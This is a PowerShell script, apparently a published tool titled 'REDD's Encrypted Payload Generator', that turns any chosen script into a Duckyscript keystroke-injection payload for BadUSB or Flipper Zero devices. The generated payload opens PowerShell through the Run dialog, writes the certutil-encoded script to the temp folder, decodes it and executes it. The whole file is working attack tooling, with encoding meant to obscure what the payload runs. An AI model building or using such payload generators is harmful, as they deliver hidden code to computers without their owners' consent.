# Title: REDD's Encrypted Payload Generator
# Description: Creates a encrypted Payload for BadUSB/Duckyscript Devices.
# AUTHOR: InfoSecREDD
# Version: 1.6
$path = split-path -parent $MyInvocation.MyCommand.Definition
$script = $MyInvocation.MyCommand.Name
$payload_filename = "gen_payload.tmp"
$payload_file = "$path\$payload_filename"
$temp_file = "$path\temp.txt"
$final_file = "$path\payload.txt"
$argcheck = $args.Count
$flipper = 0
$IsFullPath = 0
Write-Host "`n`n   :::::::::  :::::::::: :::::::::  :::::::::  ::: ::::::::  `n   :+:    :+: :+:        :+:    :+: :+:    :+: :+ :+:    :+: `n   +:+    +:+ +:+        +:+    +:+ +:+    +:+    +:+        `n   +#++:++#:  +#++:++#   +#+    +:+ +#+    +:+    +#++:++#++ `n   +#+    +#+ +#+        +#+    +#+ +#+    +#+           +#+ `n   #+#    #+# #+#        #+#    #+# #+#    #+#    #+#    #+# `n   ###    ### ########## #########  #########      ######## `n`n              REDD's Encrypted Payload Generator`n"
if ( 0 -eq $argcheck )
{
  Write-Host "`nERROR: No arguments supplied to encrypt.`n`nSyntax: $script `<File_to_Encrypt`>`n        $script `<File_to_Encrypt`> -flipper`n`n"
  exit
}
if (Test-Path "$temp_file") {
  Remove-Item "$temp_file" >$null 2>&1
}
if ( 1 -eq $argcheck )
{
  $argpath = Get-ChildItem "$args" | Select-Object -ExpandProperty FullName
  if ("$args" -eq "$argpath") {
     if (Test-Path "$args")  {
        certutil -encodehex -f "$argpath" "$temp_file" 0x40000001 >$null 2>&1
     }
  }
  elseif (Test-Path "$path\$args")  {
     certutil -encodehex -f "$path\$args" "$temp_file" 0x40000001 >$null 2>&1
  }
  else {
     Write-Host "`nERROR: No file named $args in $path.`n`n"
     exit
  }
}
elseif ( 2 -ge $argcheck ) 
{
  $showfile = $args[0]
  if (Test-Path "$showfile") {
    $argpath = Get-ChildItem $showfile | Select-Object -ExpandProperty FullName
  }
  if ("$showfile" -eq "$argpath") {
	$IsFullPath = 1
  }
  if ("$IsFullPath" -ne "1") {
     if (!(Test-Path "$path\$showfile")) {
        Write-Host "`nERROR: No file named $showfile in $path.`n`n"
        exit
     }
  }
  $showargs = $args[1]
  if ( $showargs -eq "-adv" ) {
     $AdvMode = 1
     Do {
         $flipperinput = Read-Host -Prompt 'Do you want Flipper Zero/BadUSB compatibility?(y/N):  '
     }
     Until ( $flipperinput -eq 'y' -Or $flipperinput -eq 'n' -Or $flipperinput -eq 'Y' -Or $flipperinput -eq 'N' )
     if ( $flipperinput -eq 'y' -Or $flipperinput -eq 'Y' ) {
        $flipper = 1
     }
     Do { 
         $ptitleinput = Read-Host -Prompt 'Payload Title:  '
     }
     Until ( $ptitleinput -ne "" )
     Do { 
         $pdescinput = Read-Host -Prompt 'Payload Description:  '
     }
     Until ( $pdescinput -ne "" )
     Do { 
         $pauthorinput = Read-Host -Prompt 'Payload Author:  '
     }
     Until ( $pauthorinput -ne "" )
     Do { 
         $pversioninput = Read-Host -Prompt 'Payload Version:  '
     }
     Until ( $pversioninput -ne "" )
     $delayamount = 0
     Do {
         $delayinput = Read-Host -Prompt 'Do you want to add a Custom DELAY in your Payload after Opening PowerShell(y/N):  '
     }
     Until ( $delayinput -eq 'y' -Or $delayinput -eq 'n' -Or $delayinput -eq 'Y' -Or $delayinput -eq 'N' )
     if ( $delayinput -eq 'y' -Or $delayinput -eq 'Y' ) {
       [regex] $match = '^([1-9][0-9]{2,4})$'
       do {
           $delayamount = Read-Host "Enter 3-5 digits for a Custom DELAY: "
       }
       until ($delayamount -match $match) 
     }
     Write-Host " -- It is still recommended to edit the payload to set DELAY's correctly.`n`n"
  }
  if ( $args[1] -eq "-flipper" -Or $args[1] -eq "-badusb" -Or $args[1] -eq "-adv" )
  {
     Write-Host "Creating $final_file for Flipper Zero/BadUSB Compatiblity."
     $flipper = 1
     certutil -encodehex -f "$argpath" "$temp_file" 0x40000001 >$null 2>&1
  } 
  else {
	 $showargs = $args[1]
     Write-Host "ERROR: Arugment `'$showargs`' is not valid. Please try again.`n"
     exit
  }
}
else
{
  Write-Host "Arguments are not valid. Please Try again.`n"
}
$output = Get-Content "$temp_file" | Out-String
$output = $output.replace("`r`n", "")
Remove-Item "$temp_file" >$null 2>&1
if (Test-Path "$payload_file") {
  Remove-Item "$payload_file" >$null 2>&1
  New-Item -Name "$payload_filename" -ItemType File >$null 2>&1
}
else {
  New-Item -Name "$payload_filename" -ItemType File >$null 2>&1
}

if ( $AdvMode -eq "1" ) {
  "REM Title      : $ptitleinput" | Out-File -FilePath "$payload_file" -Append
}
else {
  "REM Title      :" | Out-File -FilePath "$payload_file" -Append
}
if ( $AdvMode -eq "1" ) {
  "REM Description: $pdescinput" | Out-File -FilePath "$payload_file" -Append
}
else {
  "REM Description:" | Out-File -FilePath "$payload_file" -Append
}
if ( $AdvMode -eq "1" ) {
  "REM Author     : $pauthorinput" | Out-File -FilePath "$payload_file" -Append
}
else {
  "REM Author     :" | Out-File -FilePath "$payload_file" -Append
}
if ( $AdvMode -eq "1" ) {
  "REM Version    : $pversioninput" | Out-File -FilePath "$payload_file" -Append
}
else {
  "REM Version    :" | Out-File -FilePath "$payload_file" -Append
}
"REM Generated by REDD's Encrypted Payload Generator" | Out-File -FilePath "$payload_file" -Append
"REM - It is highly suggested you adjust the DELAYS for your use." | Out-File -FilePath "$payload_file" -Append
if ( 1 -ne $flipper )
{
  "DUCKY_LANG US" | Out-File -FilePath "$payload_file" -Append
}
else
{
  Write-Host "--> Skipping DUCKY_LANG String for Flipper Zero/BadUSB Compatibility."
}
"DELAY 2000" | Out-File -FilePath "$payload_file" -Append
"GUI r" | Out-File -FilePath "$payload_file" -Append
"DELAY 200" | Out-File -FilePath "$payload_file" -Append
"STRING powershell" | Out-File -FilePath "$payload_file" -Append
"DELAY 500" | Out-File -FilePath "$payload_file" -Append
"ENTER" | Out-File -FilePath "$payload_file" -Append
if ( 1 -ne $flipper ) {
  "DELAY 500" | Out-File -FilePath "$payload_file" -Append
}
elseif ( 1 -eq $flipper -And 0 -eq $AdvMode ) {
  Write-Host "--> Adding extra DELAY for Flipper Compatibility."
  "DELAY 2000" | Out-File -FilePath "$payload_file" -Append
}
elseif ( $AdvMode -eq 1 -And 0 -ne $delayamount) {
  "REM Custom DELAY added." | Out-File -FilePath "$payload_file" -Append
  "DELAY $delayamount" | Out-File -FilePath "$payload_file" -Append
}
else {
  "DELAY 500" | Out-File -FilePath "$payload_file" -Append
}
"STRING `$TempFile = `"`$env:TEMP\temp.ps1`"; `$File = `"`$env:TEMP\l.ps1`"; echo $output `> `"`$TempFile`"; certutil -f -decode `"`$TempFile`" `"`$File`" `| out-null`; `& `"`$env:TEMP\l.ps1`"" | Out-File -FilePath "$payload_file" -Append
"DELAY 1000" | Out-File -FilePath "$payload_file" -Append
"ENTER" | Out-File -FilePath "$payload_file" -Append
Get-Content "$payload_file" | out-file -encoding ASCII "$final_file"
Remove-Item "$payload_file" >$null 2>&1
Write-Host "`nPayload Generation Complete.`n`n  Location: $final_file`n`n"
